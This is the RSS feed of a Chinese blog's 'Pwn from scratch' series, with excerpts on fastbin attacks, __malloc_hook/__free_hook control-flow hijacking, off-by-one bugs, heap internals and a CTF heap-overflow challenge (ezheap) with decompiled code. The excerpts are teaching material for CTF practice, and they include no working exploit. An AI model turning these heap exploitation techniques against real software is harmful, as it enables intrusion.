<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on lhon901's blog</title><link>/posts/</link><description>Recent content in Posts on lhon901's blog</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Sat, 30 Aug 2025 21:27:08 +0800</lastBuildDate><atom:link href="/posts/rss.xml" rel="self" type="application/rss+xml"/><item><title>从零开始的 Pwn 之旅 - Fastbin Attack</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---fastbin-attack/</link><pubDate>Sat, 30 Aug 2025 21:27:08 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---fastbin-attack/</guid><description>&lt;h2 id="简介">简介
&lt;a class="header-anchor" href="#%e7%ae%80%e4%bb%8b">&lt;/a>
&lt;/h2>&lt;p>fastbin attack 指针对 ptmalloc2 中 fastbin 结构的攻击和漏洞利用手法&lt;/p>
&lt;p>利用前提:&lt;/p>
&lt;ul>
&lt;li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞&lt;/li>
&lt;li>漏洞发生于 fastbin 类型的 chunk 中&lt;/li>
&lt;/ul>
&lt;p>根据利用手法可分为以下几类&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Malloc_hook 和 Free_hook</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---malloc_hook-%E5%92%8C-free_hook/</link><pubDate>Sat, 30 Aug 2025 18:13:43 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---malloc_hook-%E5%92%8C-free_hook/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>在栈的利用中, 我们通过劫持程序的返回地址来实现劫持程序的控制流&lt;br>
要想通过堆来进行漏洞利用, 可能会想到通过在堆上写入 shellcode 的方式然后劫持返回地址到堆上&lt;br>
但是程序往往会开始 NX (堆栈不可执行) 保护导致利用失败&lt;br>
而且程序可能根本没有缓冲区溢出漏洞&lt;br>
&lt;code>__malloc_hook&lt;/code> 和 &lt;code>__free_hook&lt;/code> 正是为了应对这种情况的，与栈无关的堆劫持控制流的手法&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Off_by_one</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---off_by_one/</link><pubDate>Sat, 16 Aug 2025 15:39:32 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---off_by_one/</guid><description>&lt;h1 id="从零开始的-pwn-之旅--off_by_one">从零开始的 Pwn 之旅 —— Off_by_one
&lt;a class="header-anchor" href="#%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b%e7%9a%84-pwn-%e4%b9%8b%e6%97%85--off_by_one">&lt;/a>
&lt;/h1>&lt;h2 id="漏洞成因">漏洞成因
&lt;a class="header-anchor" href="#%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0">&lt;/a>
&lt;/h2>&lt;h3 id="1-循环条件计算错误">1. 循环条件计算错误
&lt;a class="header-anchor" href="#1-%e5%be%aa%e7%8e%af%e6%9d%a1%e4%bb%b6%e8%ae%a1%e7%ae%97%e9%94%99%e8%af%af">&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1">1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2">2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3">3&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">10&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// 循环体
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>上述代码实际上会执行 &lt;strong>11 次循环&lt;/strong>。开发人员本意可能只想执行 10 次循环，实际上却多执行了一次，容易导致数组或缓冲区 &lt;strong>越界&lt;/strong>。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - 简单的堆溢出</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/</link><pubDate>Fri, 15 Aug 2025 13:22:57 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E7%AE%80%E5%8D%95%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/</guid><description>&lt;h2 id="示例">示例
&lt;a class="header-anchor" href="#%e7%a4%ba%e4%be%8b">&lt;/a>
&lt;/h2>&lt;h3 id="ezheap">
&lt;a href="https://www.nssctf.cn/problem/3104" title="ezheap" rel="noopener external nofollow noreferrer" target="_blank" class=" exturl">
 ezheap
 
 &lt;i class="fa fa-external-link-alt">&lt;/i>
 
&lt;/a>
&lt;a class="header-anchor" href="#ezheap">&lt;/a>
&lt;/h3>&lt;p>经典菜单题&lt;/p>

&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1">1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2">2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3">3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4">4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5">5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6">6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-7">&lt;a class="lnlinks" href="#hl-0-7">7&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">~/D/ezheap ❯❯❯ ./ezheap
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Easy Note.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1.Add.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2.Delete.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3.Show.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">4.Edit.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Choice:&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>add 函数&lt;/p>

&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-1-1">&lt;a class="lnlinks" href="#hl-1-1"> 1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-2">&lt;a class="lnlinks" href="#hl-1-2"> 2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-3">&lt;a class="lnlinks" href="#hl-1-3"> 3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-4">&lt;a class="lnlinks" href="#hl-1-4"> 4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-5">&lt;a class="lnlinks" href="#hl-1-5"> 5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-6">&lt;a class="lnlinks" href="#hl-1-6"> 6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-7">&lt;a class="lnlinks" href="#hl-1-7"> 7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-8">&lt;a class="lnlinks" href="#hl-1-8"> 8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-9">&lt;a class="lnlinks" href="#hl-1-9"> 9&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-10">&lt;a class="lnlinks" href="#hl-1-10">10&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-11">&lt;a class="lnlinks" href="#hl-1-11">11&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-12">&lt;a class="lnlinks" href="#hl-1-12">12&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-13">&lt;a class="lnlinks" href="#hl-1-13">13&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-14">&lt;a class="lnlinks" href="#hl-1-14">14&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-15">&lt;a class="lnlinks" href="#hl-1-15">15&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-16">&lt;a class="lnlinks" href="#hl-1-16">16&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-17">&lt;a class="lnlinks" href="#hl-1-17">17&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-18">&lt;a class="lnlinks" href="#hl-1-18">18&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-19">&lt;a class="lnlinks" href="#hl-1-19">19&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-20">&lt;a class="lnlinks" href="#hl-1-20">20&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-21">&lt;a class="lnlinks" href="#hl-1-21">21&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-22">&lt;a class="lnlinks" href="#hl-1-22">22&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-23">&lt;a class="lnlinks" href="#hl-1-23">23&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-24">&lt;a class="lnlinks" href="#hl-1-24">24&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-25">&lt;a class="lnlinks" href="#hl-1-25">25&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-26">&lt;a class="lnlinks" href="#hl-1-26">26&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-27">&lt;a class="lnlinks" href="#hl-1-27">27&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-28">&lt;a class="lnlinks" href="#hl-1-28">28&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-29">&lt;a class="lnlinks" href="#hl-1-29">29&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-30">&lt;a class="lnlinks" href="#hl-1-30">30&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-31">&lt;a class="lnlinks" href="#hl-1-31">31&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-32">&lt;a class="lnlinks" href="#hl-1-32">32&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-33">&lt;a class="lnlinks" href="#hl-1-33">33&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-34">&lt;a class="lnlinks" href="#hl-1-34">34&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-35">&lt;a class="lnlinks" href="#hl-1-35">35&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-36">&lt;a class="lnlinks" href="#hl-1-36">36&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-37">&lt;a class="lnlinks" href="#hl-1-37">37&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-38">&lt;a class="lnlinks" href="#hl-1-38">38&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-39">&lt;a class="lnlinks" href="#hl-1-39">39&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-40">&lt;a class="lnlinks" href="#hl-1-40">40&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-41">&lt;a class="lnlinks" href="#hl-1-41">41&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-42">&lt;a class="lnlinks" href="#hl-1-42">42&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-43">&lt;a class="lnlinks" href="#hl-1-43">43&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-44">&lt;a class="lnlinks" href="#hl-1-44">44&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-45">&lt;a class="lnlinks" href="#hl-1-45">45&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-46">&lt;a class="lnlinks" href="#hl-1-46">46&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-47">&lt;a class="lnlinks" href="#hl-1-47">47&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-48">&lt;a class="lnlinks" href="#hl-1-48">48&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-49">&lt;a class="lnlinks" href="#hl-1-49">49&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-50">&lt;a class="lnlinks" href="#hl-1-50">50&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">add&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">v3&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+0h] [rbp-20h]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">v4&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+4h] [rbp-1Ch]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Input your idx:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">getnum&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Size:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">getnum&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">v4&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mh">0x100&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">LODWORD&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Invalid!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">heaplist&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">v3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x20u&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="n">heaplist&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">v3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Malloc Error!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v0&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">heaplist&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">v3&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_QWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">v0&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v4&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_QWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">heaplist&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">v3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">32LL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">puts&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="o">!*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_QWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">heaplist&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">v3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">16LL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Malloc Error!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sizelist&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">v3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">v4&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Name: &amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">heaplist&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">v3&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mh">0x10u&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Something error!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Content:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">heaplist&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">v3&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">16LL&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">sizelist&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">v3&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Error!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Done!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">heaplist&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">v3&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_DWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">v1&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">24&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">v1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>detele 函数&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Heap 深入理解</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---heap-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/</link><pubDate>Fri, 15 Aug 2025 12:16:16 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---heap-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/</guid><description>&lt;h2 id="bins-结构">bins 结构
&lt;a class="header-anchor" href="#bins-%e7%bb%93%e6%9e%84">&lt;/a>
&lt;/h2>&lt;hr>
&lt;h3 id="fastbin">fastbin
&lt;a class="header-anchor" href="#fastbin">&lt;/a>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>结构&lt;/strong>：单向链表&lt;/li>
&lt;li>&lt;strong>来源&lt;/strong>：free 时直接进入 fastbin&lt;/li>
&lt;li>&lt;strong>用途&lt;/strong>：快速分配和释放小块内存&lt;/li>
&lt;li>&lt;strong>chunk size 范围&lt;/strong>：
&lt;ul>
&lt;li>通常为 &lt;code>0x20&lt;/code> ~ &lt;code>0x80&lt;/code>（包含头部，具体范围随 glibc 版本变化，部分新版本为到 &lt;code>0x70&lt;/code>）&lt;/li>
&lt;li>size 字段实际为 chunk_size + 标志位&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>特点&lt;/strong>：
&lt;ul>
&lt;li>释放后立即进入 fastbin，不合并相邻空闲块&lt;/li>
&lt;li>链表长度&lt;strong>无限制&lt;/strong>（不是 7，7 是 tcache 的最大数目）&lt;/li>
